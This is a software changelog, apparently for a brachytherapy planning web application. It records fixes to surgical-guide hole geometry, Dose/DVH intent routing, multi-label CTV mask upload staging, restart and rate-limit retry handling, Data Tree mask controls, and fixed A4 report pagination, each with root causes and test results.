- `web/surgical_guide.py` now subtracts auxiliary cylinders from the bare plate
  first, fuses all primary sleeves second, and subtracts all primary bores last.
  The auxiliary holes are parallel to their associated needle, pass only
  through the plate, never create an external sleeve, and are constrained to
  remain outside the primary sleeve wall.
- The tool schema and Input panel expose enable/disable, hole diameter, ring
  count, holes per ring, first-ring offset, and ring spacing. The generated
  guide records requested, realized, skipped, ring, needle, trajectory, and
  world-coordinate metadata for the actual mesh.
- Legacy parameter snapshots that contain no auxiliary-hole fields retain the
  pre-feature guide geometry; new UI/tool requests use the auxiliary-hole
  default path explicitly.
- The Data Tree guide metadata and generation notification expose the realized
  auxiliary-hole count without creating separate fake viewer objects.

### Verification

- Remote guide regression: `26 passed, 3 warnings`.
- Local Python compilation, JavaScript syntax check, and `git diff --check`
  passed.
- The focused tests cover watertight STL output, realized hole metadata,
  disabled auxiliary holes, primary-sleeve wall validation, and legacy custom
  parameter compatibility.

## 2026-08-26 - Current Dose/DVH Recalculation Was Misrouted to Full Planning

### Confirmed issue

- A request such as `可以重新计算DVH相关指标，验证和当前的结果是否一致`
  was classified as `knowledge_query` because the interrogative marker in
  `是否一致` took precedence over the state-changing verb. Other variants
  could fall through to generic semantic action routing.
- The application already had a stateful `dose_recompute` capability, but the
  direct-execution allowlist did not include its local intent. Consequently,
  the provider remained able to select `planning_pipeline` for a request that
  only required refreshing Dose/DVH from the active plan.
- The old re-plan detector used a loose character gap between `重新` and
  `规划`. It therefore treated `重新计算当前规划方案的 DVH` as a re-plan,
  even though `规划方案` was only the object being evaluated.
- The existing high-level dose tool correctly reused the active
  Needle/Seed snapshot, but it did not expose a before/after metric
  consistency result. A live metrics dictionary could also be mutated in
  place during inference, so the comparison snapshot must be materialized
  before computation.

### Resolution

- Added an explicit `dose_recompute` local intent for unambiguous current
  Dose/DVH refresh requests in Chinese and English. It is a direct,
  single-tool grant for `dose_recompute`, with no router, completeness pass,
  segmentation, trajectory generation, or planning-pipeline dependency.
- Added the same boundary to the streaming and non-streaming direct paths and
  to clinical tool normalization. If a provider emits `planning_pipeline` for
  this request, the runtime reduces the call to the registered high-level
  `dose_recompute` tool rather than executing the wrong workflow.
- Tightened re-plan recognition so the re-plan action is adjacent to the
  planning verb (`重新规划`, `再规划`, `rerun the plan`, etc.). Explicit
  re-planning still retains the full planning contract.
- `dose_recompute` now snapshots the numeric Dose/DVH metrics before the
  authoritative manual dose calculation, compares overlapping values using
  documented numeric tolerances, returns the comparison in structured data,
  and renders a localized consistency/changed/unavailable summary.
- Focused Dose/DVH results bypass a second LLM synthesis because the tool
  formatter is already complete and authoritative. This removes an avoidable
  model call and prevents a synthesis response from obscuring the actual
  recomputation result.

### Verification

- Focused dose/recompute, current-result, authorization, and runtime contract
  tests: `66 passed` before the final in-place-mutation regression adjustment;
  the final dose-recompute suite: `10 passed`.
- Full remote regression suite: `749 passed, 6 skipped, 4 warnings`.
- Classification checks confirm that current Dose/DVH refresh phrases route to
  `dose_recompute`, read-only current-dose questions remain
  `case_dose_query`, and explicit re-planning remains `semantic_action`.
- A regression test verifies that a provider-emitted `planning_pipeline` call
  is normalized to `dose_recompute` for the affected request.

## 2026-08-26 - CTV Uploads Were Misreported During Restart and Collapsed Multi-Label Masks

### Confirmed issue

- The visible `CTV mask import failed: HTTP 202` message was not a mask-format
  failure. During server restart, the case agent is constructed before the
  workspace sidecar arrays have finished decoding. The segmentation endpoint
  intentionally returns a control-plane `202` response with
  `code=workspace_hydration_pending`, `pending=true`, and `retry_after_ms`
  while that restore is in progress. The current case log measured more than
  22 seconds for the large planning-result array phase.
- The browser's former import retry budget was only about 15 seconds. It
  therefore exhausted its retries while the server was still correctly
  restoring the case, then converted the still-pending response into a false
  import error. This explains why restarting the server reproduced the same
  error even when the uploaded file itself was valid.
- The old CTV upload path treated a multi-label file as if it were already a
  single selected clinical target. It selected one value and immediately
  wrote `ctv_array`, `ctv_mask`, `ctv_source`, and related official CTV state.
  The source labels were consequently no longer represented as independent
  Data Tree candidates, and a wrong default label could contaminate the active
  CTV before the operator had reviewed it.
- The old path had no durable Upload Mask collection contract. Generic mask
  children existed in some flows, but the original uploaded source, its label
  membership, and the parent/child relationship were not represented as one
  restart-safe object. This made it impossible for the UI to present a reliable
  source-level `Upload Mask` group and explicit label choices.
- A legacy workspace could already restore an old direct CTV as `ctv.loaded`.
  Checking only that flag would cause the new candidate staging flow to be
  skipped forever after restart, leaving the old unsafe representation in
  place.

### Resolution

- Added `web/uploaded_mask_service.py` as the source-of-truth staging boundary.
  A user-uploaded CTV file is aligned to the CT grid, validated as a
  three-dimensional discrete label volume, and persisted as:
  - one durable `Upload Mask` parent collection with source path, CT path,
    source signature, labels, voxel counts, geometry, and child IDs; and
  - one binary `uploaded_mask_label` generic child per positive source label.
  The children retain source-label and geometry provenance, start as
  `unclassified`, and do not write `ctv_array` or replace the official CTV.
  Source signatures make repeated requests and restart recovery idempotent.
- Changed the CTV branch of `/api/segmentation` in
  `web/routes/planning_routes.py` to stage the upload and return
  `staged_only=true` with the parent and child catalogue. It no longer silently
  selects a label or launches the clinical CTV-consuming workflow. The same
  source-first boundary is applied to tool-driven manual-label results in
  `AgenticSys.py`; a staging failure cannot fall through to the previous direct
  CTV write path.
- Added a body-aware hydration retry helper in
  `web/app/static/js/brachybot-ui-api.js`, and the equivalent bounded fallback
  in `web/app/static/js/brachybot-manual-annotation.js`. They honor the
  server's retry interval and wait up to 240 pending attempts, while reporting
  a hydration-specific terminal message instead of labeling a pending restore
  as an import failure. Non-202 responses still follow the normal error path.
- Changed `web/app/static/js/brachybot-viewer-volume.js` to hydrate and render
  an `Upload Mask` group with one visible Data Tree row per label child. The
  children retain independent visibility, opacity, color, export, volume, and
  context-menu behavior. The parent collection and generic children are
  rehydrated from the backend catalog rather than invented only in the DOM.
- Kept the existing explicit Data Tree classification transaction as the only
  promotion path. Right-clicking a selected uploaded label and choosing Move to
  CTV calls the generic-mask classification endpoint; the backend validates
  the selected binary child against the current CT, rejects whole-body or
  otherwise implausible candidates, records `ctv_promoted_from_upload`
  provenance, and invalidates dependent planning/dose/DVH artifacts so stale
  results cannot be presented as current.
- Updated delete reconciliation in `web/routes/data_routes.py` so deleting a
  child also updates or removes its Upload Mask parent. The viewer catalogue
  endpoint now returns both generic children and durable Upload Mask parents.
- Added restart compatibility in the CT hydration path. If a legacy direct CTV
  is restored but no Upload Mask collection with the same source path exists,
  the browser re-submits the source upload. The staging operation is
  idempotent, so an already staged/promoted source is not duplicated and a
  promoted CTV is preserved when its source collection is present.
- Bumped the cache-busting query versions for the three changed classic
  scripts in `web/app/index.html` (final versions: `ui-api` 46,
  `viewer-volume` 40, and `manual-annotation` 18). A browser or reverse proxy can therefore
  receive the hydration-aware client instead of serving a cached pre-fix
  bundle after the server restart.

### Why this matches the requested UI behavior

The proposed interaction is the correct semantic boundary: importing a file
creates an `Upload Mask` source group and exposes its labels; the user then
reviews the candidates and explicitly moves the chosen label to CTV. This
separates file ingestion from clinical structure selection. It fixes the
multi-label ambiguity rather than merely hiding the error message. It must be
combined with the hydration-aware `202` handling above, because the restart
error and the unsafe automatic label selection are two independent defects.

### Verification

- Remote Python compilation passed for all modified Python modules and the new
  staging test module.
- `git diff --check` passed.
- Focused regression suite: `137 passed, 3 warnings`.
- Full remote regression suite: `753 passed, 6 skipped, 4 warnings`.
- A remote smoke test staged a two-label NIfTI with one parent and two binary
  children, confirmed a second stage reused the same collection, and confirmed
  that no official CTV array was written. A separate smoke test explicitly
  promoted one child, confirmed CTV equals that selected child, and confirmed
  that an implausible body-sized child was rejected at promotion.
- The remote environment has no Node executable, so JavaScript validation was
  performed through the existing frontend contract/static regression tests;
  `node --check` was not available on that host.

## 2026-08-26 - Hydration Polling Exhausted the Request Rate Limit and Reappeared as a Mask Import Failure

### Confirmed issue

- The second restart failure, `CTV mask import failed: Rate limit exceeded`,
  was a distinct follow-on defect from the earlier `HTTP 202` repair. The
  latest remote log measured the planning-result hydration phase at
  `45687.0 ms`.
- The new segmentation retry loop still accepted the server's historical
  `retry_after_ms=250`. During a 45.7-second restore this generated roughly
  183 POST requests. The server's local-development limiter allows 120
  requests per IP in 60 seconds, so the retry loop itself caused the 429.
- The rate limiter returned only a generic `Rate limit exceeded` JSON body.
  The upload client treated every non-202 response as terminal, so it exposed
  the limiter's recovery state as a CTV mask failure. The response did not tell
  the client when the oldest retained request would expire.
- The same request budget can be consumed by parallel viewer hydration calls.
  Fixed sub-second polling in label-volume and generic-mask restore paths made
  the global per-IP limit an unsuitable coordination mechanism for a cold
  workspace restore. Two equivalent Upload Mask requests could also run in
  parallel because there was no single-flight guard around the segmentation
  POST.

### Resolution

- `web/server_support.py` now returns a structured rate-limit response with
  `code=rate_limit_exceeded`, `retry_after_ms`, `Retry-After-Ms`, and the
  standard `Retry-After` header. The retry interval is calculated from the
  oldest retained timestamp, so the client waits until the request window can
  actually admit another request instead of blindly retrying.
- `web/app/static/js/brachybot-ui-api.js` now enforces a minimum one-second
  hydration poll interval and a five-second cap for ordinary 202 restoration.
  A server-generated rate-limit 429 is retried only when it carries the
  explicit `rate_limit_exceeded` code, using the server-provided wait interval
  up to 60 seconds. Other 429 responses remain terminal errors.
- The same behavior was added to the standalone fallback in
  `web/app/static/js/brachybot-manual-annotation.js`. The main segmentation
  helper also uses a session/body keyed single-flight map, so an automatic
  source-path restore and a manual click cannot create duplicate polling
  loops for the same case and upload.
- Viewer CT, organ metadata, label-volume, and generic Upload Mask hydration
  retries in `web/app/static/js/brachybot-viewer-volume.js` now use at least
  one-second intervals and understand the structured rate-limit response.
  This prevents the viewer's parallel cold-restore work from recreating the
  same request storm outside the CTV upload button.
- The cache-busting versions in `web/app/index.html` were advanced again to
  `ui-api?v=46`, `viewer-volume?v=40`, and `manual-annotation?v=18`, ensuring
  that browsers receive the rate-limit-aware client bundle after restart.

### Verification

- Focused Upload Mask, frontend contract, and rate-limit tests: `117 passed,
  3 warnings` before the final version-only regression assertion update; the
  final combined focused/regression group passed `145 tests`.
- Full remote regression suite after the final changes: `755 passed, 6
  skipped, 4 warnings`.
- Python compilation and `git diff --check` passed.
- `node --check` passed for the three changed JavaScript deployment files on
  the local validation host. The remote runtime itself has no Node executable.
- The rate-limit unit test confirms that the returned wait is based on the
  oldest request's expiration rather than a fixed short delay. Static frontend
  tests confirm the 429 code branch, one-second minimum, and single-flight
  guard are present.

## 2026-08-26 - Upload Mask label controls were disconnected by the new durable IDs

### Confirmed issue

The Upload Mask group could be rendered in the Data Tree, but the controls on
its individual label rows did not change the underlying display state. The
failure was silent: clicking a label eye did not hide its 2D overlay or 3D
mesh, and the row opacity/color controls, per-label context menu, UI command
bridge, and some batch actions could also appear to do nothing.

This was not caused by the uploaded voxel data, the multi-label staging
contract, or a loss of presentation state during restart. The group-level
Upload Mask actions already used _maskBelongsToGroup() and therefore could
find the children. The defect was specifically in the individual-node
identity routing.

### Root cause

web/uploaded_mask_service.py intentionally assigns each uploaded positive
label a durable ID of the form
upload_mask_<digest>_label_<label>. This ID is the correct source-child
identity and is different from the historical manual-mask spellings
mask_<id> and mask:<id>.

Several independent viewer paths still used only those old prefixes as a
type test:

- renderTreeItem() did not classify an uploaded child as a mask
  sub-item/3D-capable row.
- toggleDataVisibility() and setDataOpacity() never entered their mask
  branches. They fell through to dataTreeState[id], where no top-level
  property exists, and returned without a state mutation.
- Color lookup, mesh appearance synchronization, selection grouping, and
  the UI-controller setDataItemVisibility() path could not resolve the
  uploaded child to state.maskLabels.
- Right-click classification therefore did not expose the mask-specific
  Rename, 3D Reconstruct, Move to CTV/OAR, Delete, and color actions for the
  new IDs. Batch opacity/visibility and object-id mutation reconciliation had
  the same prefix assumption.
- The individual 3D reconstruction path accepted only mask_*, so an
  uploaded child could be hydrated as a ready generic mask but still fail to
  produce its standalone 3D mesh when explicitly reconstructed.

Because these paths returned normally instead of throwing, the UI gave no
diagnostic indication that the clicked control had been ignored.

### Resolution

- Added _isDataTreeMaskId() to
  web/app/static/js/brachybot-viewer-volume.js. It recognizes the two legacy
  spellings for backward compatibility and, importantly, resolves any ID
  present in the live state.maskLabels registry. The helper is exposed as
  the cross-script window.isDataTreeMaskId contract together with the
  canonical window.getDataTreeMaskState resolver.
- Routed every individual mask operation through that identity contract:
  rendering/indentation, visibility, opacity, color, 3D mesh appearance,
  selection grouping, context-menu classification, rename, delete/move
  object-ID conversion, batch actions, group opacity mesh lookup, and the
  UI-controller visibility setter.
- Updated web/app/static/js/brachybot-viewer-layout.js so an uploaded label
  is treated as a persisted generic mask when the user requests 3D
  reconstruction. Updated web/app/static/js/brachybot-3d-manual.js so the
  resulting mesh remains associated with the same Data Tree mask node rather
  than being incorrectly mirrored as a Planning mesh.
- The 2D path continues to use the mask's own visible and visible2D values,
  while the 3D path uses visible and visible3D. The parent
  Segmentation/Upload Mask group constraint remains enforced, so hiding a
  parent still hides descendants and changing a child does not mutate
  sibling labels.
- Bumped the classic-script cache versions in web/app/index.html to
  viewer-volume.js?v=41, viewer-layout.js?v=32, and
  3d-manual.js?v=65. The unchanged UI API and manual annotation bundles
  remain at v46 and v18.

### Verification

- Focused Upload Mask, Data Tree, viewer frontend, round-6, and round-7
  regression tests: 227 passed, 3 warnings.
- Python compilation and git diff --check passed.
- JavaScript syntax checks passed for the exact remote versions of
  brachybot-viewer-volume.js, brachybot-viewer-layout.js, and
  brachybot-3d-manual.js using the local Node validation executable.
- Static assertions verify the new registry-based resolver, uploaded-label
  handling, cross-script 3D routing, and cache-busting versions.
- Existing source-first behavior remains covered: upload creates a parent
  Upload Mask collection plus binary label children; no official CTV is
  selected automatically; explicit Move to CTV/OAR remains the only promotion
  path.

## 2026-08-26 - Report evidence screenshots changed the report paper size

### Confirmed issue

The report preview and the generated print window did not keep a single physical
paper size when a case contained multiple screenshots. Wide 3D captures caused
some evidence sheets to become landscape A4, while portrait captures remained
portrait. The result was a report whose page dimensions changed after more
figures were added. This is a real layout defect because a formal clinical
report must have predictable A4 sheets independent of source-image geometry.

The original report also placed an unbounded OAR table on one page. A large
table could extend beyond the page footer or force the browser's print layout to
create an unintended extra-height page. During the first visual validation,
the initial 30-row continuation limit was measured and rejected because the
second OAR page still overflowed the fixed A4 content box.

### Root cause

The defect had four interacting causes:

1. _reportFigurePageOrientation() in
   web/app/static/js/brachybot-report-export.js inferred the page orientation
   from the screenshot aspect ratio. A screenshot with an aspect ratio of at
   least 1.2 was emitted with report-page--landscape, and the print stylesheet
   mapped that class to size: A4 landscape with a 297 mm page width. The
   source image was therefore allowed to change the paper contract.

2. _captureReportCanvasCrop() in
   web/app/static/js/brachybot-report-editor.js cropped captures to a fixed
   16:9 target aspect. That made the capture itself conform to the camera
   composition instead of preserving the complete screenshot and delegating
   fitting to the report layout. It could remove clinically relevant content
   at the top or bottom of a non-16:9 source canvas.

3. .report-page previously had only a minimum height in the live preview, and
   the print rules mixed a minimum-height portrait page with an independent
   landscape rule. Intrinsic image dimensions and normal-flow table height could
   therefore participate in page sizing before the print window finished loading
   fonts and images.

4. The OAR renderer appended every OAR row into one .report-page. The table
   header was not repeated on continuation pages because continuation pages did
   not exist. The page footer was consequently not a reliable boundary for
   large real-world OAR sets.

### Resolution

- web/app/static/js/brachybot-report-export.js:877-886 now defines one
  explicit REPORT_PAGE_ORIENTATION = 'portrait' contract. Every newly rendered
  evidence sheet is emitted without a generated landscape class and carries
  data-page-orientation="portrait".
- web/app/static/js/brachybot-report-export.js:949-956 calculates the total
  page count from the actual evidence count and the actual OAR continuation
  count. The fixed OAR capacity is now 24 rows per page, which leaves room for
  the heading, explanatory text, repeated header, and footer inside A4.
- web/app/static/js/brachybot-report-export.js:1139-1193 renders the OAR
  table as a bounded sequence of pages. Each continuation page repeats the
  table header, receives a clear (2), (3), etc. heading, and keeps the correct
  global page number. An empty OAR result still occupies exactly one bounded
  page.
- web/app/static/js/brachybot-report-export.js:1500-1603 now uses only
  @page reportPortrait { size: A4 portrait; margin: 0; }. Each page has
  width, min-width, and max-width of 210 mm plus height, min-height, and
  max-height of 297 mm, box-sizing: border-box, overflow: hidden,
  contain: layout paint, and the portrait page name. The historical
  report-page--landscape selector remains only as a compatibility alias for
  old exported HTML and resolves to the same portrait A4 dimensions; it cannot
  reintroduce a landscape sheet.
- web/app/static/js/brachybot-report-editor.js:915-951 replaces the crop
  helper with _captureReportCanvasFit(). It preserves the complete source
  canvas and aspect ratio. It only downsamples when the source long edge is
  larger than the configured limit, and it never crops or stretches the
  capture. The 16:9 value remains a camera-framing preference, not an image
  destruction or paper-orientation rule.
- web/app/static/css/brachybot-panels-viewers.css:761-855 applies the same
  fixed A4 contract to the live preview. Each evidence page uses one bounded
  176 mm media slot, width: auto and height: auto constraints, and
  object-fit: contain with centered positioning. Wide and portrait source
  images are thus scaled into the same paper box while retaining their full
  content.
- web/app/index.html:1516-1521 bumps the relevant classic-script and
  stylesheet cache versions (dvh-planning?v=25, report-editor?v=25,
  report-export?v=26, and panels-viewers.css?v=14) so a browser restart cannot
  silently reuse the old orientation/crop implementation.
- The report contract tests were updated to reject active landscape print rules,
  reject 297 mm-wide pages, require the full-canvas fit helper, verify the
  24-row OAR pagination contract, and verify the fixed A4 evidence media slot.

### Verification

- Focused report/frontend regression group: 149 passed, 3 warnings.
- Full remote suite after the final 24-row correction: 756 passed, 6
  skipped, 4 warnings.
- Remote Python compilation and git diff --check passed.
- The exact remote JavaScript files were streamed to the local Node validation
  executable for syntax checking because the remote runtime has no node
  command. Both brachybot-report-editor.js and brachybot-report-export.js
  passed.
- A browser layout harness rendered the current remote CSS and the current
  report editor/export renderer with a synthetic report containing seven
  evidence images (wide, portrait, axial, sagittal, coronal, dose-surface,
  and DVH) plus 59 OAR rows. The renderer produced 14 pages: four fixed
  report pages, two Figure 1 pages, five Figure 2 pages, and three OAR pages.
- Automated measurements reported one page size only:
  793.69 x 1122.52 CSS px, which is 210 x 297 mm at 96 CSS dpi. All 14 pages
  reported that same size, no page carried report-page--landscape, and all
  14 pages reported no content overflow.
- The seven image aspect ratios were preserved while being contained in the
  same 176 mm slot. Representative rendered sizes included 2000x900 to
  672.75x303.83 px, 900x1400 to 428.33x665.17 px, 1600x1000 to
  672.75x421.22 px, and 1000x1600 to 416.48x665.17 px. The measured image
  boxes stayed within their media boxes.
- Visual inspection of the generated wide Figure 1 page, portrait Figure 1
  page, wide Figure 2 page, and all three OAR continuation pages confirmed
  that the image content remained complete, pages stayed portrait A4, OAR
  rows were split as 24/24/11, repeated headers remained readable, and
  footers stayed inside the paper boundary. The initial 30-row overflow was
  not retained.
